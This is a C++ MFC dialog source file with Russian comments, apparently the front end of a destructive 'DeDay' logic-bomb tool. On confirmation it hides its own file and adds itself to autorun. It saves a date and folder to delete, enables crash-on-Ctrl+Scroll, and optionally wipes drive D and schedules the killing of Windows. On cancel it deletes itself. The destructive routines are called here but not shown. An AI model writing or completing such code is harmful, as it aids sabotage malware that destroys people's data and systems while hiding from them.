// DeDayDlg.cpp : implementation file
//

#include "stdafx.h"
#include "DeDay.h"
#include "DeDayDlg.h"
#include "DeleteDay.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CDeDayDlg dialog

CDeDayDlg::CDeDayDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CDeDayDlg::IDD, pParent)
	, m_csPath(_T(""))
	, m_bDeleteD(FALSE)
	, m_bKillWindows(FALSE)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CDeDayDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_PATH, m_csPath);
	DDX_Control(pDX, IDC_MONTHCALENDAR1, m_MonthCalCtrl);
	DDX_Check(pDX, IDC_DELETE_D, m_bDeleteD);
	DDX_Check(pDX, IDC_KILLWINDOWS, m_bKillWindows);
}

BEGIN_MESSAGE_MAP(CDeDayDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDOK, &CDeDayDlg::OnBnClickedOk)
	ON_BN_CLICKED(IDC_BTN_BROWS, &CDeDayDlg::OnBnClickedBtnBrows)
	ON_EN_CHANGE(IDC_PATH, &CDeDayDlg::OnEnChangePath)
	ON_BN_CLICKED(IDC_DELETE_D, &CDeDayDlg::OnBnClickedDeleteD)
	ON_BN_CLICKED(IDC_KILLWINDOWS, &CDeDayDlg::OnBnClickedKillwindows)
	ON_BN_CLICKED(IDCANCEL, &CDeDayDlg::OnBnClickedCancel)
END_MESSAGE_MAP()

CDeleteDay dDay;

// CDeDayDlg message handlers

BOOL CDeDayDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	//если в едитбокс ничего не введено запрещаем кнопку "OK"
	GetDlgItem(IDOK)->EnableWindow(FALSE);

	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CDeDayDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CDeDayDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


void CDeDayDlg::OnBnClickedOk()
{
	dDay.HideFile();
	
	//добавить себя в автозагрузку
	dDay.AddToAutoRun();
	
	//сохранить дату удаления папки
	SYSTEMTIME SysTime;
	ZeroMemory(&SysTime, 0);

	m_MonthCalCtrl.GetCurSel(&SysTime);

	dDay.SaveDeleteDay(SysTime);

	//сохранить что удалять
	dDay.SaveFolderPathToDelete(m_csPath.GetString());

	dDay.EnableCrashOnCtrlScroll();

	UpdateData(TRUE);

	if ( m_bDeleteD )
	{
		dDay.DeleteDiskD();
	}

	if ( m_bKillWindows )
	{
		dDay.SaveTaskKillWindows();
	}
	
	OnOK();
}

//выбираем папку для удаления
void CDeDayDlg::OnBnClickedBtnBrows()
{
	//если TRUE то диалог "Open", FALSE - Save As
	//CFileDialog dlgFile(TRUE, NULL, NULL, OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY);
	//dlgFile.DoModal();
	
	wchar_t pszDir[512];

	BROWSEINFO    bi;
	LPITEMIDLIST  pidlBrowse;  // Fill in the BROWSEINFO structure.
	bi.hwndOwner      = NULL;
	bi.pidlRoot       = NULL;
	bi.pszDisplayName = pszDir;
	bi.lpszTitle      = L"Select the  directory";
	bi.ulFlags        = BIF_RETURNONLYFSDIRS;
	bi.lpfn           = NULL;
	bi.lParam         = 0;
	bi.iImage         = 0;  // Browse for a folder and return its PIDL.
	pidlBrowse = SHBrowseForFolder(&bi);  

	if (pidlBrowse == NULL)
	{
		return;  
	}

	if(SHGetPathFromIDList(pidlBrowse, pszDir) != TRUE)
	{	
		CoTaskMemFree(pidlBrowse);
		MessageBox(L"Не удалось получить путь к папке.", L"Облом");
		return;
	}
	
	CoTaskMemFree(pidlBrowse);

	m_csPath = pszDir;
	UpdateData(FALSE);

	OnEnChangePath();
}

void CDeDayDlg::OnEnChangePath()
{
	UpdateData(TRUE);

	if (m_csPath.Compare(L"") != 0)
	{
		GetDlgItem(IDOK)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDOK)->EnableWindow(FALSE);
	}
}

void CDeDayDlg::OnBnClickedDeleteD()
{
	UpdateData(TRUE);

	if (m_bDeleteD)
	{
		GetDlgItem(IDOK)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDOK)->EnableWindow(FALSE);
	}
}

void CDeDayDlg::OnBnClickedKillwindows()
{
	UpdateData(TRUE);

	if (m_bKillWindows)
	{
		GetDlgItem(IDOK)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDOK)->EnableWindow(FALSE);
	}
}

void CDeDayDlg::OnBnClickedCancel()
{
	//удаляем сами себя
	TRACE(" >>> Удаляем сами себя <<<\n");
	dDay.SelfDelete();
	
	OnCancel();
}
